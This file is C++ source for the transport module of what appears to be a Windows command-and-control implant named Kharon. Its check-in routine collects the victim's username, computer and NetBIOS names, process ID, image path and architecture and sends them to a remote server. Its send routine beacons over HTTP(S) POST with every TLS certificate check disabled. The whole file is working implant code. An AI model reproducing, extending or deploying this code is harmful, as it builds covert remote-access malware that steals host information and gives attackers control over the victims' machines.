#include <Kharon.h>

using namespace Root;

auto DECLFN Transport::Checkin(
    VOID
) -> BOOL {
    PPACKAGE CheckinPkg = Self->Pkg->Checkin();
    PPARSER  CheckinPsr = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );
    
    KhDbg( "start checkin routine" );

    PVOID  Data    = NULL;
    SIZE_T Length  = 0;
    PCHAR  NewUUID = NULL;
    PCHAR  OldUUID = NULL;
    ULONG  UUIDsz  = 36;

    KhDbg( "%s", Self->Session.AgentID ); 
    KhDbg( "%X", Self->Machine.OsArch ); 

    Self->Pkg->Pad( CheckinPkg, UC_PTR( Self->Session.AgentID ), 36 );
    Self->Pkg->Byte( CheckinPkg, Self->Machine.OsArch );
    Self->Pkg->Str( CheckinPkg, Self->Machine.UserName );
    Self->Pkg->Str( CheckinPkg, Self->Machine.CompName );
    Self->Pkg->Str( CheckinPkg, Self->Machine.NetBios );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ProcessID );
    Self->Pkg->Str( CheckinPkg, Self->Session.ImagePath );
    Self->Pkg->Str( CheckinPkg, "0.0.0.0" );

    Self->Pkg->Transmit( CheckinPkg, &Data, &Length );

    KhDbg( "transmited return %p [%d bytes]", Data, Length );

    Self->Psr->New( CheckinPsr, Data, Length );
    if ( !CheckinPsr->Original ) return FALSE;

    OldUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );
    NewUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );

    KhDbg( "old uuid: %s", OldUUID );
    KhDbg( "new uuid: %s", NewUUID );

    if ( !NewUUID ) { INT3BRK; }

    Self->Session.AgentID = A_PTR( Self->Hp->Alloc( UUIDsz ) );
    Mem::Copy( Self->Session.AgentID, NewUUID, UUIDsz );

    if ( ( NewUUID && Str::CompareA( NewUUID, Self->Session.AgentID ) != 0 ) ) {
        Self->Session.Connected = TRUE;
    }

    KhDbg( "set uuid: %s", Self->Session.AgentID );

    KhDbg( "checkin routine done..." );

    Self->Psr->Destroy( CheckinPsr );

    return TRUE;
}

auto DECLFN Transport::Send(
    _In_      PVOID   Data,
    _In_      UINT64  Size,
    _Out_opt_ PVOID  *RecvData,
    _Out_opt_ UINT64 *RecvSize
) -> BOOL {
    HANDLE hSession = NULL;
    HANDLE hConnect = NULL;
    HANDLE hRequest = NULL;

    ULONG  HttpAccessType  = 0;
    PWCHAR HttpProxy       = { 0 };
    ULONG  HttpFlags       = 0;
    ULONG  OptFlags        = 0;

    BOOL   Success = 0;

    PVOID  TmpBuffer     = NULL;
    PVOID  RespBuffer    = NULL;
    SIZE_T RespSize      = 0;
    DWORD  BytesRead     = 0;
    UINT32 ContentLength = 0;
    ULONG  ContentLenLen = sizeof( ContentLength );

    ULONG HttpStatusCode = 0;
    ULONG HttpStatusSize = sizeof( HttpStatusCode );

    HttpFlags = INTERNET_FLAG_RELOAD;

    hSession = Self->Wininet.InternetOpenW(   
        Self->Tsp->Web.UserAgent, HttpAccessType,
        HttpProxy, 0, 0
    );
    if ( !hSession ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }

    hConnect = Self->Wininet.InternetConnectW(
        hSession, Self->Tsp->Web.Host, Self->Tsp->Web.Port,
        Self->Tsp->Web.ProxyUsername, Self->Tsp->Web.ProxyPassword,
        INTERNET_SERVICE_HTTP, 0, 0
    );
    if ( !hConnect ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }

    if ( Self->Tsp->Web.Secure ) {
        HttpFlags |= INTERNET_FLAG_SECURE;
        OptFlags   = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID   |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID     |
            SECURITY_FLAG_IGNORE_WRONG_USAGE         |
            SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
    }        

    hRequest = Self->Wininet.HttpOpenRequestW( 
        hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL, 
        NULL, NULL, HttpFlags, 0 
    );
    if ( !hRequest ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }

    Self->Wininet.InternetSetOptionW( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );

    Success = Self->Wininet.HttpSendRequestW(
        hRequest, Self->Tsp->Web.HttpHeaders,
        Str::LengthW( Self->Tsp->Web.HttpHeaders ),
        Data, Size
    );
    if ( !Success ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }

    Self->Wininet.HttpQueryInfoW(
        hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &HttpStatusCode, &HttpStatusSize, NULL
    );

    KhDbg( "http status code %d", HttpStatusCode );

    if ( Success ) {
        Success = Self->Wininet.HttpQueryInfoW(
            hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
            &ContentLength, &ContentLenLen, NULL
        );
        if ( !Success ) { 
            if ( KhGetError == 12150 ) {
                KhDbg( "content-length header not found" );
            } else {
                KhDbg( "last error: %d", KhGetError );
            }
        }

        RespSize = ContentLength;
        
        if ( RespSize ) {
            RespBuffer = C_PTR( Self->Hp->Alloc( RespSize + 1 ) );
            Self->Wininet.InternetReadFile( hRequest, RespBuffer, RespSize, &BytesRead );
        } else {
            RespSize   = 0;
            RespBuffer = NULL;
            TmpBuffer  = C_PTR( Self->Hp->Alloc( BEG_BUFFER_LENGTH ) );

            do {
                Self->Wininet.InternetReadFile( hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead );

                RespSize += BytesRead;

                if ( !RespBuffer ) {
                    RespBuffer = C_PTR( Self->Hp->Alloc( RespSize ) );
                } else {
                    RespBuffer = C_PTR( Self->Hp->ReAlloc( RespBuffer, RespSize ) );
                }

                Mem::Copy( C_PTR( U_PTR( RespBuffer ) + ( RespSize - BytesRead ) ), TmpBuffer, BytesRead );
                Mem::Zero( U_PTR( TmpBuffer ), BytesRead );
                
            } while ( BytesRead > 0 );
            
            Self->Hp->Free( TmpBuffer );
        }
        
        KhDbg( "request: at %p [%d bytes]\n", RespBuffer, RespSize );

        if ( RespBuffer ) *RecvData = RespBuffer;
        if ( RecvSize   ) *RecvSize = RespSize;

        Success = TRUE;            
    } else {
        if ( KhGetError == 12029 ) {
            return FALSE;
        } else {
            return TRUE;
        }

        Success = FALSE;
    }

_KH_END:
    if ( hSession ) Self->Wininet.InternetCloseHandle( hSession );
    if ( hConnect ) Self->Wininet.InternetCloseHandle( hConnect );
    if ( hRequest ) Self->Wininet.InternetCloseHandle( hRequest );

    return Success;
}
